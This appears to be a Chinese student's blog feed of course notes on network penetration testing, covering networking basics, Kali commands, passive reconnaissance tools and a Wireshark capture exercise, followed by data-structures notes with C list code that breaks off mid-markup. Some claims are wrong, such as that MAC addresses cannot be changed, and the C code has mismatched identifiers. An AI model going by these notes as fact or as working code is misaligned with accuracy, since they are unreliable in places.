    
    
    <entry>
      <title>网络渗透测试CH4</title>
      <link href="/2023/11/20/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95ch4/"/>
      <url>/2023/11/20/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95ch4/</url>
      
        <content type="html"><![CDATA[<h3 id="Review："><a href="#Review：" class="headerlink" title="Review："></a>Review：</h3><p>子网掩码：与IP地址做与运算判断是否在同一网络中</p><h3 id="TCP-IP协议，体系"><a href="#TCP-IP协议，体系" class="headerlink" title="TCP/IP协议，体系"></a>TCP/IP协议，体系</h3><p>TCP/IP是常用的四层结构，</p><p><img src="https://img-blog.csdn.net/20171215000304120?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMjI0NjQ1NQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><p>协议是<strong>水平的</strong>，即两个协议是<strong>控制两个对等的实体</strong>进行通信的规则。</p><p>服务是<strong>垂直的</strong>，即服务是<strong>从下通过层间接口向上</strong>进行提供的</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><a href="https://imgse.com/i/piUdJeA"><img src="https://z1.ax1x.com/2023/11/20/piUdJeA.png" alt="piUdJeA.png"></a></p><p>传输层中以端口做区分，也可以叫做是传输层的地址</p><p>域名也被看做是一个地址</p><p><a href="https://imgse.com/i/piUdtot"><img src="https://z1.ax1x.com/2023/11/20/piUdtot.png" alt="piUdtot.png"></a></p><p>MAC地址不可更改！！！</p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p><a href="https://imgse.com/i/piUdUFP"><img src="https://z1.ax1x.com/2023/11/20/piUdUFP.png" alt="piUdUFP.png"></a></p><p>互联网的最小单位是交换机以及其下连接的电脑，交换机通过一个路由器连接到其他的交换机</p><h3 id="交叉线"><a href="#交叉线" class="headerlink" title="交叉线"></a>交叉线</h3><p>直通线：网线两头线序一致（均为568A或68B）叫直通线。<br>交叉线：网线一头是568A线序，另一头是568B线序。</p><p>如果是计算机与交换机或HUB相连，则两头都做568a，或两头都做568b，即使用直通线；如果是两台计算机互连或ADSL MODEM与HUB连接，则需要一头做568a，另一头做568b，也就是常说的1和3，2和6互换了，即使用交叉线。</p><p><img src="https://bkimg.cdn.bcebos.com/pic/0dd7912397dda144da48b24db8b7d0a20df48688?x-bce-process=image/watermark,image_d2F0ZXIvYmFpa2U5Mg==,g_7,xp_5,yp_5/format,f_auto" alt="img"></p><h5 id="网关配置中通常使用-1还是-254？"><a href="#网关配置中通常使用-1还是-254？" class="headerlink" title="网关配置中通常使用.1还是.254？"></a>网关配置中通常使用.1还是.254？</h5><p><strong>一般来说是254，因为一般255是作为广播地址，而在1-254中随便选择一个数还要跳过的话，不如直接将254设置成网关</strong></p><p>LAN和WAN</p><p>GPON：<a href="https://zhuanlan.zhihu.com/p/80270214">EPON与GPON的应用与区别 - 知乎 (zhihu.com)</a></p><p>ISP网络服务提供商</p><p>ACL访问控制列表</p><h3 id="ABC类网段"><a href="#ABC类网段" class="headerlink" title="ABC类网段"></a>ABC类网段</h3><p>10开头的IP是A类地址的私有地址</p><p>C类网络是最多的，但是只能容纳2^8 -2个主机IP</p><p>A类网络是最少的，但是只能容纳2^24 -2个主机IP</p><p><img src="https://img-blog.csdnimg.cn/20190705095636130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3NzMyODI5,size_16,color_FFFFFF,t_70" alt="img"></p><h3 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a><strong>NAT</strong></h3><p>IP地址中主机标识位全0表示整个网络全1表示广播</p><p>在<strong>公网</strong>的范围内，IP地址唯一</p><p>socket套接字</p><h3 id="UDP和TCP"><a href="#UDP和TCP" class="headerlink" title="UDP和TCP"></a>UDP和TCP</h3><p>TCP有连接，UDP无连接，广播，QQ都是用UDP，但是QQ传文件使用的是TCP</p><p>qq使用的是oicq协议（仅限腾讯qq.exe，tim和qq内测版不是oicq的）</p><h3 id="交换机switch"><a href="#交换机switch" class="headerlink" title="交换机switch"></a>交换机switch</h3><p>switch既可以表示交换机也可以表示开关，交换机用过CAM进行数据帧转发，当交换机收到数据帧时，会查找CAM表对应的表象并转发给对应接口。这个过程就像开关闭合</p><h3 id="任务："><a href="#任务：" class="headerlink" title="任务："></a>任务：</h3><p>手机传图片给电脑抓包</p><p>首先打开wireshark抓包，手机电脑要再同一网络下，</p><p><a href="https://imgse.com/i/piU6PKK"><img src="https://z1.ax1x.com/2023/11/20/piU6PKK.png" alt="piU6PKK.png"></a></p><p>ip.src==你手机的ip，因为传文件是TCP协议，随便抓一个追踪流就行，记得改成原始数据</p><p><a href="https://imgse.com/i/piU6FbD"><img src="https://z1.ax1x.com/2023/11/20/piU6FbD.png" alt="piU6FbD.png"></a></p><p>打不开，用010或者winhex删除前面的一大串就可</p><p><a href="https://imgse.com/i/piU6AVe"><img src="https://z1.ax1x.com/2023/11/20/piU6AVe.png" alt="piU6AVe.png"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试CH3</title>
      <link href="/2023/11/13/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH3/"/>
      <url>/2023/11/13/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH3/</url>
      
        <content type="html"><![CDATA[<h3 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h3><p>开源情报，指的是从公共资源中手机信息以在情报环境中使用他。</p><h2 id="内网，DMZ，外网"><a href="#内网，DMZ，外网" class="headerlink" title="内网，DMZ，外网"></a>内网，DMZ，外网</h2><p>DMZ是位于两个防火墙之间的空间，比    Internet的安全性高，比内网的安全性低。DMZ的中文称呼是隔离区，也称为非军事区</p><h3 id="内网，DMZ，外网之间的访问策略"><a href="#内网，DMZ，外网之间的访问策略" class="headerlink" title="内网，DMZ，外网之间的访问策略"></a>内网，DMZ，外网之间的访问策略</h3><h4 id="1-内网可以访问外网"><a href="#1-内网可以访问外网" class="headerlink" title="1.内网可以访问外网"></a>1.内网可以访问外网</h4><p>内网用户可以访问外网，在这里要进行源地址转换</p><h4 id="2-内网用户可以访问DMZ"><a href="#2-内网用户可以访问DMZ" class="headerlink" title="2.内网用户可以访问DMZ"></a>2.内网用户可以访问DMZ</h4><p>方便内网用户使用和管理DMZ的服务器</p><h4 id="3-外网不能访问内网"><a href="#3-外网不能访问内网" class="headerlink" title="3.外网不能访问内网"></a>3.外网不能访问内网</h4><h4 id="4-外网可以访问DMZ"><a href="#4-外网可以访问DMZ" class="headerlink" title="4.外网可以访问DMZ"></a>4.外网可以访问DMZ</h4><h4 id="5-DMZ不可以访问内网"><a href="#5-DMZ不可以访问内网" class="headerlink" title="5.DMZ不可以访问内网"></a>5.DMZ不可以访问内网</h4><h4 id="6-DMZ不可以访问外网"><a href="#6-DMZ不可以访问外网" class="headerlink" title="6.DMZ不可以访问外网"></a>6.DMZ不可以访问外网</h4><p>这一条有例外，比如将邮件服务器放置到DMZ就需要能够访问到外网。</p><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>内容分发网路，采用更大量的缓存服务器，不知放在用户相对集中的区域，当用户访问的时候利用全局负载技术，将用户的访问只想距离最近的缓存服务器上。</p><p>简单来说就是在用户的附近建立一个本地仓库，就近给你内容（发货）</p><p>可以看这一篇</p><p><a href="https://zhuanlan.zhihu.com/p/52362950">到底什么是CDN？ - 知乎 (zhihu.com)</a></p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>WEB应用防火墙</p><p>带宽的单位<strong>dps</strong>，当然也可以mbps</p><p><strong>hash是用来校验的</strong></p><h2 id="TTL—网络中的生存时间"><a href="#TTL—网络中的生存时间" class="headerlink" title="TTL—网络中的生存时间"></a>TTL—网络中的生存时间</h2><p>每经过一个路由器就会-1</p><p>不同的操作系统对TTL的初始值是不同的，比如</p><p><a href="https://imgse.com/i/piJSUE9"><img src="https://z1.ax1x.com/2023/11/13/piJSUE9.png" alt="piJSUE9.png"></a></p><p>我ping自己的本地是128，但是我ping</p><p>作业：</p><ul><li>与ZoomEye功能类似的搜索引擎还有哪些？</li></ul><p>奇安信的鹰图，fofa，站长之家等等</p><ul><li>子域名收集</li></ul><p><a href="https://imgse.com/i/piJS6De"><img src="https://z1.ax1x.com/2023/11/13/piJS6De.png" alt="piJS6De.png"></a></p><ul><li>利用ZoomEye进行相关搜索</li></ul><p><a href="https://imgse.com/i/piJS48P"><img src="https://z1.ax1x.com/2023/11/13/piJS48P.png" alt="piJS48P.png"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试</title>
      <link href="/2023/11/06/CH2/"/>
      <url>/2023/11/06/CH2/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig  查看你电脑的ip地址</span><br><span class="line">对于linux系统应该是ifconfig</span><br></pre></td></tr></table></figure><h3 id="查看IP信息"><a href="#查看IP信息" class="headerlink" title="查看IP信息"></a>查看IP信息</h3><h4 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h4><p>if–interface接口</p><p>config–configer配置程序</p><h4 id="eth0"><a href="#eth0" class="headerlink" title="eth0"></a>eth0</h4><p>eth–ethernet以太网</p><p><a href="https://baike.baidu.com/item/%E4%BB%A5%E5%A4%AA%E7%BD%91/99684">以太网_百度百科 (baidu.com)</a></p><p>FE–快速以太网</p><p><a href="https://zhuanlan.zhihu.com/p/139707963">标准以太网、快速以太网、千兆以太网和万兆以太网分别是什么？ - 知乎 (zhihu.com)</a></p><p>localback回环地址</p><p>netmask子网掩码，判断你是在哪个网络中（IP地址和子网掩码进行”与“运算）</p><p>192.xxx.xxx.0最后一位是0表示这一个网络</p><p>192.xxx.xxx.255表示这个网络的所有主机</p><h3 id="查看路由信息"><a href="#查看路由信息" class="headerlink" title="查看路由信息"></a>查看路由信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">再kali中是route -n</span><br><span class="line">再windows是route PRINT</span><br></pre></td></tr></table></figure><h3 id="DNS信息"><a href="#DNS信息" class="headerlink" title="DNS信息"></a>DNS信息</h3><p>每一个电脑实际上都是有一个DNS域名解析服务器nameserver</p><p>正常访问一个网站访问的是他的IP，这个IP并不方便记忆，所以出现了DNS，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www.baidu.com</span><br><span class="line">com是一个互联网通用的</span><br><span class="line">baidu是百度的域名</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样子就好记忆多了</p><h3 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h3><p>网关是连接两个不同网络之间的通讯与控制</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMzgyMTA4LzIwMTYwNC8zODIxMDgtMjAxNjA0MDkxNjQ5MDMxNDAtOTQ5NTcyMDA3LnBuZw?x-oss-process=image/format,png" alt="img"></p><p>gateway默认网关</p><p>自动设置就是利用<strong>DHCP（Dynamic Host Configuration Protocol, 动态主机配置协议）服务器</strong>来自动给网络中的计算机分配IP地址、子网掩码和默认网关 。</p><h4 id="单播"><a href="#单播" class="headerlink" title="单播"></a>单播</h4><p>对特定的主机进行数据传送，简单来说就是两个设备点对点进行通信</p><h4 id="组播"><a href="#组播" class="headerlink" title="组播"></a>组播</h4><p>一个设备与关系其数据的部分设备进行通信，也就是说一个设备对一组特定的主机进行通信</p><p>(多用于<strong>D类IP</strong>)</p><h4 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h4><p>一个设备对本网络内所有设备进行通信就是广播</p><h2 id="虚拟机的三种模式"><a href="#虚拟机的三种模式" class="headerlink" title="虚拟机的三种模式"></a>虚拟机的三种模式</h2><p><img src="https://pic1.zhimg.com/80/v2-82deb4be7068ec65b3ab251df22d5130_720w.webp" alt="img"></p><h5 id="桥接"><a href="#桥接" class="headerlink" title="桥接"></a>桥接</h5><p>桥接就是使用物理机的MAC地址，但是是有自己的独立IP的</p><p><img src="https://img-blog.csdnimg.cn/20201216200700237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ3MzU0ODI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h5><p>NAT就是将物理机作为路由器进行上网</p><h5 id="HOST"><a href="#HOST" class="headerlink" title="HOST"></a>HOST</h5><p>图片来自</p><p><a href="https://zhuanlan.zhihu.com/p/65103100">“桥接”和“NAT”方式区别 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/qq_47354826/article/details/111301616">VMware虚拟机三种网络模式详解–Bridged（桥接模式）_vm桥接模式是什么意思-CSDN博客</a></p><h2 id="Kali-linux常用命令"><a href="#Kali-linux常用命令" class="headerlink" title="Kali linux常用命令"></a>Kali linux常用命令</h2><h3 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PWD命令是Print Working Directory（打印工作目录）的缩写，其功能是显示当前工作目录。</span><br><span class="line">cd是Change Directory（更改目录）的缩写，其功能是将活动目录更改为指定的路径。</span><br><span class="line">ls命令用于显示指定工作目录下之内容（列出当前工作目录所含之文件及子目录)。</span><br><span class="line">locate命令用于查找符合条件的文件。</span><br><span class="line">whereis命令也用于查找文件。</span><br><span class="line">which命令会在环境变量$PATH设置的目录里查找符合条件的文件。  </span><br><span class="line">mkdir是make directory（创建目录）的缩写，用于创建新的目录。</span><br><span class="line">cp: 复制文件或目录，语法为“cp 源文件 目标文件”</span><br><span class="line">rmdir用来删除一个空的目录，rm 命令来删除非空目录。</span><br></pre></td></tr></table></figure><h3 id="文件查看"><a href="#文件查看" class="headerlink" title="文件查看"></a>文件查看</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat命令用来显示文件内容，语法为“cat 目录项”，cat命令可以在屏幕上显示文件，可以合并文件，还可以建立文本文件。</span><br><span class="line">另外head、tail、nl、more和less命令也可以用来浏览文件。</span><br><span class="line">grep 命令用于查找文件里符合条件的字符串。</span><br><span class="line">more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，使用者在阅读时可以按空格键（space）来显示下一页，按 b 键来返回（back）一页显示。</span><br><span class="line">less 与 more 类似，但使用 less 可以随意浏览文件，下面是使用less参数显示文件内容之后，使用者可以进行的一些操作。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Kali Linux 2同时支持net-tools和iproute2，所以可以使用这两种命令来完成对网络的配置和查看。如果要查看设备的网络连接信息，可以使用“ip addr”和“sudo ifconifg”</span><br><span class="line">ip命令中常用的方法有：</span><br><span class="line">ip addr show：显示网络信息；</span><br><span class="line">ip route show：显示路由 ；</span><br><span class="line">ip neigh show：显示arp表（相当于Windows的arp命令）；</span><br><span class="line">重启网络：ifdown &lt;网络接口名称&gt; ifup &lt;网络接口名称&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Shell脚本"><a href="#Shell脚本" class="headerlink" title="Shell脚本"></a>Shell脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Shell脚本与Windows/Dos下的批处理相似，也就是用各类命令预先放入到一个文件中，方便一次性执行的一个程序文件，主要是方便进行设置或者管理用的。Shell 脚本的编写跟 JavaScript、php 编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。</span><br><span class="line">那么打开一个编辑器，输入以下内容。</span><br><span class="line">#! /bin/bash</span><br><span class="line">echo &quot;Hello, Kali!&quot;</span><br><span class="line">将该文件保存为HelloKali，不需要后缀名。</span><br><span class="line">当前我们还不能执行这个脚本，这是因为该脚本的权限导致的。这里可以使用ls -l命令来查看这个文件的权限。当前这个文件只有w和r权限，是不能执行的，这里需要为它添加一个可执行的权限。</span><br><span class="line">chmod  755  HelloKali</span><br><span class="line">再次使用ls -l查看，可以看到它具有了可执行权限。</span><br><span class="line">kali &gt; ./HelloKali</span><br><span class="line">这里的./ 可以理解为在当前目录下查找文件。</span><br><span class="line">按下回车可以看到屏幕上输出：</span><br><span class="line">Hello, Kali!</span><br><span class="line">这表明当前程序已经成功执行。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在Linux术语中，服务指的是在运行在后台等待使用的应用程序。Service命令用于对系统服务进行管理，比如启动（start）、停止（stop）、重启（restart）、查看状态（status）等。在Kali linux2中预装了很多服务。在Kali Linux中的有些服务可以通过GUI停止和启动，就像在Windows或Mac里一样。但是，也有些服务需要使用命令行管理。我们在这里介绍管理基本服务的语法：</span><br><span class="line">service servicename start|stop|restart</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试</title>
      <link href="/2023/10/30/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B%EF%BC%881%EF%BC%89/"/>
      <url>/2023/10/30/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B%EF%BC%881%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>物理地址（也可以叫做mac）和IP地址</p><h4 id="物理地址："><a href="#物理地址：" class="headerlink" title="物理地址："></a>物理地址：</h4><p>存储在网卡中，是网卡出厂时带的，是唯一不会变的（追踪地址的时候追踪的也是物理地址）</p><h4 id="IP地址："><a href="#IP地址：" class="headerlink" title="IP地址："></a>IP地址：</h4><p>是计算机在网络中的唯一身份ID，与现实世界中快递的配送需要有具体的住宅地址是一个道理。</p><h5 id="windows中查看自己的地址"><a href="#windows中查看自己的地址" class="headerlink" title="windows中查看自己的地址"></a>windows中查看自己的地址</h5><p>cmd启动命令指令符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/all</span><br></pre></td></tr></table></figure><h5 id="linux中查看自己的地址"><a href="#linux中查看自己的地址" class="headerlink" title="linux中查看自己的地址"></a>linux中查看自己的地址</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -all</span><br></pre></td></tr></table></figure><h3 id="PE启动盘"><a href="#PE启动盘" class="headerlink" title="PE启动盘"></a>PE启动盘</h3><p>其实就是在U盘中提前预装好系统，当进入的时候直接访问U盘中的系统而不是电脑的系统。</p><p>如果得到一个人的电脑，可以用PE启动盘访问它的数据盘（好像是这样的）</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h4><p>给出指定的目标主机，对目标主机主动发起扫描</p><h5 id="主动扫描工具："><a href="#主动扫描工具：" class="headerlink" title="主动扫描工具："></a>主动扫描工具：</h5><p>Nmap</p><h4 id="被动扫描"><a href="#被动扫描" class="headerlink" title="被动扫描:"></a>被动扫描:</h4><p>在目标无法察觉的情况下进行的信息收集</p><p>（可以理解为，如果我要知道一个A的信息，我不去问A而去问B，这样我得到了A的信息，A也不知道我得到了他的信息）</p><h5 id="被动扫描的工具"><a href="#被动扫描的工具" class="headerlink" title="被动扫描的工具"></a>被动扫描的工具</h5><p>Maltego<br>Recon-NG<br>ZoomEye</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="/2023/10/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2023/10/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><p>数据结构是一门研究数据组织存储和运算的一般方法的学科。</p><h3 id="数据结构中有几种类型"><a href="#数据结构中有几种类型" class="headerlink" title="数据结构中有几种类型"></a>数据结构中有几种类型</h3><ul><li>线性表</li></ul><p>​    逻辑特征：一对一</p><p>​    直接前驱，直接后驱，开始结点，终端结点</p><ul><li><p>树</p><p>逻辑特征：一对多</p><p>有且只有一个根节点，</p><p>除根节点外，每个节点都有且只有一个唯一的前驱</p><p>除叶子结点外，每个节点都有后继结点</p></li><li><p>图</p><p>逻辑结构：多对多</p></li></ul><h3 id="数据结构的存储类型分类："><a href="#数据结构的存储类型分类：" class="headerlink" title="数据结构的存储类型分类："></a>数据结构的存储类型分类：</h3><p>顺序存储：按照给定的顺序进行存储</p><p>链式存储：使用链的形式进行存储</p><p>散列存储</p><p>索引存储</p><h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p>一个算法是由若干的指令组成的有序数组</p><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><ul><li>有穷性：算法在有穷的步数中结束，每一步都在有穷的时间内完成</li><li>确定性：每条指令的含义都必须明确</li><li>可行性：能够由机器人或者计算机或者人完成</li></ul><h3 id="检验一个算法的好坏"><a href="#检验一个算法的好坏" class="headerlink" title="检验一个算法的好坏"></a>检验一个算法的好坏</h3><ul><li>正确性：能否满足预先的功能和性能要求</li><li>可读性：算法是够可读，易读</li><li>健壮性：当输入非法时，算法是否能及时给出反馈</li><li>时间效率和空间效率：两个复杂度</li></ul><h3 id="时间复杂度和空间复杂度"><a href="#时间复杂度和空间复杂度" class="headerlink" title="时间复杂度和空间复杂度"></a>时间复杂度和空间复杂度</h3><p>时间复杂度：执行当前算法所消耗的时间</p><p>空间复杂度：执行当前算法所占用的内存</p><p><a href="https://www.yuque.com/vernus-u2vmo/tgvyrt/to9tln8g55kvhl0y?singleDoc#">https://www.yuque.com/vernus-u2vmo/tgvyrt/to9tln8g55kvhl0y?singleDoc#</a></p><h2 id="线性表和链表"><a href="#线性表和链表" class="headerlink" title="线性表和链表"></a>线性表和链表</h2><h4 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h4><p>基本概念：一个数据元素的有序集，其基本特征</p><ul><li>集合中存在唯一的一个第一个元素</li><li>集合中存在唯一的一个最后一个元素</li><li>除第一个元素外都存在为一个直接前驱</li><li>除最后一个元素外都存在唯一的一个直接后驱</li></ul><h5 id="顺序表的建立"><a href="#顺序表的建立" class="headerlink" title="顺序表的建立"></a>顺序表的建立</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">typedef int Datatype；</span><br><span class="line">struct List</span><br><span class="line">&#123;</span><br><span class="line">int MAX;</span><br><span class="line">int n;</span><br><span class="line">DataType *elem;</span><br><span class="line">&#125;;</span><br><span class="line">typedef struct List*SeqList;</span><br></pre></td></tr></table></figure><h5 id="顺序表的判空"><a href="#顺序表的判空" class="headerlink" title="顺序表的判空"></a>顺序表的判空</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SeqList SetNullList_seq(int m)</span><br><span class="line">&#123;</span><br><span class="line">    SeqList slist=(SeqList)malloc(sizeof(struct List));</span><br><span class="line">    if(slist!=NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        slist-&gt;elem=(DataType*)malloc(sizeof(DataType)*m);</span><br><span class="line">        if(slist-&gt;elem)</span><br><span class="line">        &#123;</span><br><span class="line">            slist-&gt;Max=m;</span><br><span class="line">            slist-&gt;n=0;</span><br><span class="line">            return(slist);</span><br><span class="line">        &#125;</span><br><span class="line">        else free(slist);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;ALLoc failure!\n&quot;);</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="顺序表的插入"><a href="#顺序表的插入" class="headerlink" title="顺序表的插入"></a>顺序表的插入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int InsertPre_seq(SeqList slist,int p,DataType x)</span><br><span class="line">&#123;</span><br><span class="line">    int q;</span><br><span class="line">    if(slist-&gt;n&gt;=slist-&gt;Max)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;overflow&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if(p&lt;0||p&gt;slist-&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;not exist!\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    for(q=slist-&gt;n-1;q&gt;=p;q--)</span><br><span class="line">    slist-&gt;elem[q+1]=slist-&gt;elem[q];</span><br><span class="line">    slist-&gt;elem[p]=x;</span><br><span class="line">    slist-&gt;n=slist-&gt;n+1;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="顺序表的删除"><a href="#顺序表的删除" class="headerlink" title="顺序表的删除"></a>顺序表的删除</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int DelIndex_seq(SeqList slist,int p)</span><br><span class="line">&#123;</span><br><span class="line">    int q;</span><br><span class="line">    if(p&lt;0||p&gt;=slist-&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Not exist&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">     &#125; </span><br><span class="line">     for(q=p;q&lt;slist-&gt;n-1;q++)</span><br><span class="line">     &#123;</span><br><span class="line">         slist -&gt;elem[q]=slist -&gt;elem[q+1];</span><br><span class="line">     &#125;</span><br><span class="line">     slist -&gt;n=slist-&gt;n-1;</span><br><span class="line">     return 1;</span><br><span class="line">&#125;</span><br><span 